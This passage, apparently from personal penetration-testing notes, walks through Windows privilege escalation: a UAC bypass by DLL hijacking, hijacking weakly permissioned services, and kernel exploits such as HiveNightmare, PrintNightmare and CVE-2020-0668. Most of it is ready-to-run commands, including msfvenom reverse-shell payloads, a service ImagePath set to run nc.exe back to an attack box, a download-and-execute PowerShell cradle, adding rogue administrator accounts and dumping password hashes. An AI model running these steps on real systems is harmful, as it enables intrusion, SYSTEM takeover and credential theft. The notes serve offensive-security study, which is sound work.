</span><span class="c"># The higher the level, the fewer the bypasses.</span><span class="w">
</span><span class="c"># 0x5 is the higher level:</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ConsentPromptBehaviorAdmin</span><span class="w">

</span><span class="c"># Check Windows version for possible bypasses.</span><span class="w">
</span><span class="c"># Find the release version online with the build</span><span class="w">
</span><span class="c"># version this outputs:</span><span class="w">
</span><span class="p">[</span><span class="n">environment</span><span class="p">]::</span><span class="n">OSVersion.Version</span><span class="w">
</span></code></pre></div>

<p>With this info, we can check the usage section of <a href="https://github.com/ovelny/UACME" rel="nofollow">this repo</a>, and possibly find a bypass that will work on our target.</p>

<p>One example is the auto-elevating binary <code>SystemPropertiesAdvanced.exe</code> for <code>Windows 10 build 14393</code>. In this build version, the 32 bit version of this binary will look for the <code>srrstr.dll</code> DLL on the system, but this one is absent.</p>

<p>The following search order is used by Windows to locate a DLL:</p>

<ul>
<li>The directory from which the application loaded.</li>
<li>For 64-bit systems, the <code>C:\Windows\System32</code> directory.</li>
<li>For 16-bit systems, the <code>C:\Windows\System</code> directory.</li>
<li>The Windows directory.</li>
<li>All directories listed in the <code>PATH</code> env variable.</li>
</ul>

<p>We can for directories in the <code>PATH</code> variable with <code>cmd /c echo %PATH%</code>. If any of them is writable by our current user, we might take advantage of this bypass by placing a malicious <code>srrstr.dll</code> there and perform DLL hijacking:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Generate a DLL that will spawn a reverse shell</span>
<span class="c"># on our attack box:</span>
msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> srrstr.dll
</code></pre></div>

<p>Once downloaded to the target and with a listener set in our attack box, check if our payload works:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">rundll32</span><span class="w"> </span><span class="nx">shell32.dll</span><span class="p">,</span><span class="nx">Control_RunDLL</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">absolute</span><span class="w"> </span><span class="nx">path</span><span class="err">&gt;</span><span class="nx">\srrstr.dll</span><span class="w">
</span></code></pre></div>

<p>Next, leverage our DLL hijacking with <code>SystemPropertiesAdvanced.exe</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># After running the binary, use whoami /priv</span><span class="w">
</span><span class="c"># with the connection received on our listener</span><span class="w">
</span><span class="c"># to check if UAC bypass worked:</span><span class="w">
</span><span class="n">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><span class="w">
</span></code></pre></div>

<h3>Leveraging weak permissions</h3>

<p>Permissions are notoriously hard to get right on Windows. We might not often find improperly set permissions with apps from large vendors, but smaller vendors, open-source software and custom apps might introduce some. Because services often run with <code>SYSTEM</code> privileges, hijacking one with weak permissions might escalate our own privileges.</p>

<p>Once compiled against the target, we can use tools like <a href="https://github.com/GhostPack/SharpUp/" rel="nofollow">SharpUp</a>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Identify service binaries with weak ACLs:</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpUp.exe</span><span class="w"> </span><span class="nx">audit</span><span class="w">

</span><span class="c"># If binaries are found, check their ACLs in detail.</span><span class="w">
</span><span class="c"># Check for instance if unprivileged groups like EVERYONE</span><span class="w">
</span><span class="c"># and BUILTIN\Users have been granted permissions on the</span><span class="w">
</span><span class="c"># binary or its directory, e.g. "BUILTIN\Users:(I)(F)":</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\&lt;binary absolute path&gt;"</span><span class="w">

</span><span class="c"># If we can replace and start the binary as an unprivileged</span><span class="w">
</span><span class="c"># user, generate a binary with msfvenom and replace the original</span><span class="w">
</span><span class="c"># service binary:</span><span class="w">
</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">/Y</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"C:\&lt;binary absolute path&gt;"</span><span class="w">

</span><span class="c"># Run the replaced service binary:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># If SharpUp reports modifiable services instead of modifiable</span><span class="w">
</span><span class="c"># services *binaries*, we need to use accesschk from the sysinternals</span><span class="w">
</span><span class="c"># suite to enumerate permissions on the service. Check for instance if</span><span class="w">
</span><span class="c"># this reports SERVICE_ALL_ACCESS rights over the service, meaning</span><span class="w">
</span><span class="c"># read and write control over it:</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nt">-quvcw</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># If we have the proper permissions, try changing the binary path</span><span class="w">
</span><span class="c"># with a payload:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="s2">"cmd /c net localgroup administrators &lt;current username&gt; /add"</span><span class="w">

</span><span class="c"># Stop and start vulnerable service.</span><span class="w">
</span><span class="c"># Starting it will fail the normal process,</span><span class="w">
</span><span class="c"># but run our payload nonetheless:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># To clean up after ourselves, revert binpath and</span><span class="w">
</span><span class="c"># start the service for real:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="s2">"c:\&lt;binary absolute path&gt;"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Check if service is running properly:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">binary</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">extension</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>One notable attack with this method is leveraging the Windows Update Orchestrator Service (UsoSvc), running as <code>NT AUTHORITY\SYSTEM</code> if the security patch for <code>CVE-2019-1322</code> isn&#39;t applied on our target.</p>

<p>Another classic case of weak permissions is unquoted service paths: the registry configuration of a service contains the path of the binary to be run on service start. That path <em>must</em> be enclosed within quotes, or else Windows will try to locate the binary within each section of the path separated with spaces.</p>

<p>For instance, if the service binary path is <code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code> without quotes, Windows will look for the binary in the following paths, implicitely appending the <code>.exe</code> file extension:</p>

<ul>
<li>C:\Program</li>
<li>C:\Program Files</li>
<li>C:\Program Files (x86)\System</li>
<li>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64</li>
</ul>

<p>So if we can create for instance a <code>C:\Program Files (x86)\System.exe</code> payload on our target, it will get executed instead of the intended path. This is a rare occurence however, as we usually won&#39;t have the admin privileges to touch anything in this path. And even if we do, we usually won&#39;t have the permissions to restart the service. So just finding unquoted service paths does not mean we can exploit them.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Search for unquoted service paths:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"c:\windows\\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""

# Check for found services in detail:
sc.exe qc &lt;binary name without file extension&gt;
</span></code></pre></div>

<p>We can also check for weak service ACLS in the Windows registry with accesschk:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check with accesschk:</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span><span class="nt">-kvuqsw</span><span class="w"> </span><span class="nx">hklm\System\CurrentControlSet\services</span><span class="w">

</span><span class="c"># If weak service ACLs such as KEY_ALL_ACCESS are found,</span><span class="w">
</span><span class="c"># Change its ImagePath value with payload of our choice:</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\Services\</span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"ImagePath"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s2">"C:\Users\hacky\Downloads\nc.exe -e cmd.exe &lt;attack box IP&gt; &lt;attack box port&gt;"</span><span class="w">
</span></code></pre></div>

<p>Finally, we can use wmic to check what programs run during system startup. If we have write permissions to the registry for a given binary, or can overwrite a binary listed, we may escalate our privileges to another user next time they log in.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List all programs running at system startup:</span><span class="w">
</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nx">Win32_StartupCommand</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">command</span><span class="p">,</span><span class="w"> </span><span class="nx">Location</span><span class="p">,</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="o">|</span><span class="n">fl</span><span class="w">
</span></code></pre></div>

<p>Potential autorun locations can be found <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries" rel="nofollow">here</a> and <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2" rel="nofollow">here</a>.</p>

<h3>Leveraging kernel exploits</h3>

<p>Many kernel exploits have been released over the years, and ensuring all servers and desktops are kept up to date is a tedious, if not unreachable task among any organization. For this reason, it&#39;s important to keep an eye out for potential kernel exploits that might allow us to escalate our privileges.</p>

<p>The first step for this possible path is to enumerate installed updates and missing patches:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Either of these commands can enumerate them:</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">
</span><span class="nx">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">brief</span><span class="w">
</span><span class="n">Get-Hotfix</span><span class="w">
</span></code></pre></div>

<p>Each KB (Knowledge Base ID number) can be compared with the <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808" rel="nofollow">Microsoft Update Catalog</a> to check what fixes have been installed or not, and how far behind our current system is.</p>

<p>Some notable vulnerabilities are:</p>

<ul>
<li><p>MS08-067: affects Windows Server 2000, 2003, 2008, Windows XP and Vista. It is caused by improper handling of RPC requests and needs access to SMB through port 445. If our target is vulnerable but port 445 is behind a firewall, we can always forward it to our attack box if we have some form of access. Check out Legacy on HackTheBox for some practice.</p></li>
<li><p>MS17-010: EternalBlue, part of the <a href="https://en.wikipedia.org/wiki/The_Shadow_Brokers" rel="nofollow">shadow brokers</a> leak. It leverages a vulnerability in SMBv1, mishandling manually crafted packets leading to code execution as <code>SYSTEM</code>. Can also be used as a local privilege escalation vector, just like the previous vulnerability. Check out Blue on HackTheBox for some practice.</p></li>
<li><p>ALPC Task Scheduler 0-Day: the Windows Task Scheduler uses an ALPC endpoint method that can be leveraged to write arbitrary DACLs to .job files in the C:\Windows\tasks directory. We can then create a hard link for a file that we control. A writeup is available <a href="https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html" rel="nofollow">here</a>, check out Hackback on HackTheBox for some practice.</p></li>
<li><p>HiveNightmare / SeriousSam / CVE-2021-36934: a Windows 10 vulnerability allowing any user to read the Windows registry and access sensitive info. This allows us to read the SAM, SYSTEM and SECURITY registry hives, copy them offline and extract password hashes, local admin included. More info can be found <a href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5" rel="nofollow">here</a>. A PoC binary is available <a href="https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe" rel="nofollow">here</a> and a script to detect the vulnerability can be found <a href="https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1" rel="nofollow">here</a>. The entire repo for this PoC can be found <a href="https://github.com/GossiTheDog/HiveNightmare" rel="nofollow">here</a>.</p></li>
</ul>

<p>We can also check for the vulnerability with <code>icacls</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check permissions on SAM file. If this</span><span class="w">
</span><span class="c"># outputs "BUILTIN\Users:(I)(RX)", we have</span><span class="w">
</span><span class="c"># read access and the target is vulnerable:</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="nx">c:\Windows\System32\config\SAM</span><span class="w">
</span></code></pre></div>

<p>This also requires the presence of one or several shadow copies on the target system. Since Windows 10 systems have <code>System Protection</code> enabled by default, this will usually be the case. Once <code>.\HiveNightmare.exe</code> has been run and copies have been transferred to our attack box, we can attempt to extract the hashes with <code>secretsdump</code>:</p>

<div class="highlight"><pre class="highlight shell"><code>secretsdump.py <span class="nt">-sam</span> &lt;SAM file&gt; <span class="nt">-system</span> &lt;SYSTEM file&gt; <span class="nt">-security</span> &lt;SECURITY file&gt; <span class="nb">local</span>
</code></pre></div>

<ul>
<li>PrintNightmare / CVE-2021-1675 / CVE-2021-34527: this vulnerability exploits a flaw in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22" rel="nofollow">RpcAddPrinterDriver</a>, which is used for remote printing and driver installation. By exploiting this flaw, any authenticated user can add a print driver to a Windows system, without requiring the <code>SeLoadDriverPrivilege</code> privilege. This in return would give us remote code execution as <code>SYSTEM</code>. This vulnerability can be present in any version of Windows as long as Print Spooler is running, which is the case by default for Domain Controllers, Windows 7 and 10, and sometimes Windows servers: the attack surface is tremendous as a result. PoCs are widely available, using either <a href="https://github.com/cube0x0/CVE-2021-1675" rel="nofollow">C#</a> or <a href="https://github.com/calebstewart/CVE-2021-1675" rel="nofollow">powershell</a>.</li>
</ul>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check if Print Spooler service is running.</span><span class="w">
</span><span class="c"># This will return "path does not exist" if not:</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\localhost\pipe\spoolss</span><span class="w">

</span><span class="c"># Bypass execution policy before running the</span><span class="w">
</span><span class="c"># powershell PoC:</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w">

</span><span class="c"># Import the powershell PoC and use it to add</span><span class="w">
</span><span class="c"># a new admin user:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\CVE-2021-1675.ps1</span><span class="w">
</span><span class="n">Invoke-Nightmare</span><span class="w"> </span><span class="nt">-NewUser</span><span class="w"> </span><span class="s2">"hacky"</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="s2">"HackHack1234!"</span><span class="w"> </span><span class="nt">-DriverName</span><span class="w"> </span><span class="s2">"PrintIt"</span><span class="w">

</span><span class="c"># Check user have been added as local admin:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">hacky</span><span class="w">
</span></code></pre></div>

<ul>
<li>CVE-2020-0668: this vulnerability can escalate our privileges by exploiting an arbitrary file move with the Windows Service Tracing. Setting a custom MaxFileSize value in the Windows Registry that is smaller than the file size will cause it to be renamed with a .OLD extension, which is performed by <code>NT AUTHORITY\SYSTEM</code>. This can be leveraged by moving a file we created, using mount points and symbolic links.</li>
</ul>

<p>We can build <a href="https://github.com/RedCursorSecurityConsulting/CVE-2020-0668" rel="nofollow">this exploit</a> in Visual Studio, on a custom VM or directly on the target. Once built, we can either try to overwrite any protected Windows file by chaining this vulnerability with <a href="https://github.com/itm4n/UsoDllLoader" rel="nofollow">UsoDllLoader</a> or <a href="https://github.com/xct/diaghub" rel="nofollow">DiagHub</a>, or use any third-party service that runs in the SYSTEM context.</p>

<p>Not that the first method (protected Windows file) might not work, if Windows Updates are pending or being installed (UsoDllLoader) or if the DiagHub service is not available.</p>

<p>With third-party services, here is how we can proceed:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check permission of service binary. Here we check</span><span class="w">
</span><span class="c"># Mozilla Maintenance Service, which runs as SYSTEM:</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</span><span class="w">
</span></code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Generate a malicious binary that will replace the</span>
<span class="c"># service binary:</span>
msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> maintenanceservice.exe

<span class="c"># Setup a Python HTTP server to upload it on target:</span>
python3 <span class="nt">-m</span> http.server 8080
</code></pre></div><div class="highlight"><pre class="highlight powershell"><code><span class="c"># Download two copies of the malicious binary on target.</span><span class="w">
</span><span class="c"># We grab two of them because running the exploit will</span><span class="w">
</span><span class="c"># corrupt our first malicious .exe:</span><span class="w">
</span><span class="n">wget</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/maintenanceservice.exe</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">maintenanceservice.exe</span><span class="w">
</span><span class="n">wget</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/maintenanceservice.exe</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">maintenanceservice2.exe</span><span class="w">

</span><span class="c"># Run the exploit we compiled before:</span><span class="w">
</span><span class="o">.</span><span class="n">\CVE-2020-0668.exe</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">absolute</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">malicious</span><span class="w"> </span><span class="o">.</span><span class="nf">exe</span><span class="err">&gt;</span><span class="nx">\maintenanceservice.exe</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</span><span class="w">

</span><span class="c"># Check permissions of the new file this created.</span><span class="w">
</span><span class="c"># This should return that we have now full control over</span><span class="w">
</span><span class="c"># the binary with an entry such as "&lt;machine name&gt;/&lt;username&gt;:(F)":</span><span class="w">
</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</span><span class="w">

</span><span class="c"># Because this corrupted our malicious binary, we need</span><span class="w">
</span><span class="c"># to replace it with the copy we donwloaded earlier.</span><span class="w">
</span><span class="c"># The copy command only works with cmd.exe, not powershell:</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">/Y</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">absolute</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">second</span><span class="w"> </span><span class="nx">malicious</span><span class="w"> </span><span class="o">.</span><span class="nf">exe</span><span class="err">&gt;</span><span class="nx">\maintenanceservice2.exe</span><span class="w"> </span><span class="s2">"c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</span><span class="w">
</span></code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Set up our listener with metasploit:</span>
rlwrap ncat <span class="nt">-lvnp</span> &lt;attack box port&gt;
</code></pre></div><div class="highlight"><pre class="highlight powershell"><code><span class="c"># Then on our target, run our malicious payload.</span><span class="w">
</span><span class="c"># This will return an error but we should catch a</span><span class="w">
</span><span class="c"># NT AUTHORITY\SYSTEM shell on our target:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">MozillaMaintenance</span><span class="w">
</span></code></pre></div>

<p>And we are done.</p>

<h3>Leveraging vulnerable services</h3>

<p>If our target system is fully patched, it&#39;s still possible to escalate our privileges with vulnerable third-party applications, either by installing one or using one already present.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Enumerate installed applications:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="w">

</span><span class="c"># If an application stands out, check</span><span class="w">
</span><span class="c"># on which port the service is running:</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">

</span><span class="c"># Or if you already know the port,</span><span class="w">
</span><span class="c"># filter it:</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">port</span><span class="w"> </span><span class="nx">number</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># With previous netstat output, check</span><span class="w">
</span><span class="c"># that the PID matches the running process:</span><span class="w">
</span><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-Id</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PID</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Do one last check of the running service:</span><span class="w">
</span><span class="n">Get-Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'&lt;service name&gt;*'</span><span class="p">}</span><span class="w">
</span></code></pre></div>

<p>Depending on the results, the exploit we might use will be vastly different. Use searchsploit and exploit-db with the info we gathered to find PoCs.</p>

<p>Some PoCs add a user in the local <code>Administrators</code> group as a payload: this would work to esclalate our privileges, but that&#39;s not stealthy at all. Suppose the PoC is in powershell and the payload is stored in a variable, like so:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"net user hacky /add"</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>We can change that to a reverse shell instead. Download <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" rel="nofollow">Invoke-PowerShellTcp.ps1</a>, rename it and append the following as the last line of the file:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">port</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>This will directly run the script defined before that line. Next start a local Python HTTP server from our attack box:</p>

<div class="highlight"><pre class="highlight shell"><code>python3 <span class="nt">-m</span> http.server 8080
</code></pre></div>

<p>And replace the <code>$cmd</code> variable in the PoC with the following:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell IEX(New-Object Net.Webclient).downloadString('http://&lt;attack box IP&gt;:&lt;attack box port&gt;/shell.ps1')"</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>You might need to modify powershell execution policy with <code>Set-ExecutionPolicy Bypass -Scope Process</code> first, and then run the PoC. We will now catch a <code>SYSTEM</code> shell instead, by executing a script that will not even be stored on our target. Much more stealthy.</p>

<h3>Leveraging DLL injection</h3>

<p>A Dynamic Link Library (DLL) is essentially code that is called and inserted into a running process. Because of this, it&#39;s possible to patch code without needing to restart an ongoing process immediately.</p>

<p>From the standpoint of an attacker however, this also means we can inject a malicious DLL that might run within the process context. Because the process is generally trusted, this is particularly effective to evade detection. This section is out-of-scope for me right now, but let&#39;s enumerate our options quickly nonetheless.</p>

<p>Several methods are available for DLL injection, such as <code>LoadLibrary</code>:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// Using LoadLibrary to load a DLL into the current process</span>
    <span class="n">HMODULE</span> <span class="n">hModule</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"hacky.dll"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hModule</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to load DLL.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Successfully loaded DLL!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>However, this function is often monitored by security systems. Another method is manual mapping, which essentially load the DLL as raw data into the target process, map the DLL sections and inject shellcode into it. It avoids further detection but that&#39;s an incredibly complex method.</p>

<p>Other methods include reflective DLL injection as described <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" rel="nofollow">here</a>, DLL hijacking and proxying.</p>

<h2>Escalating privileges with credential theft</h2>

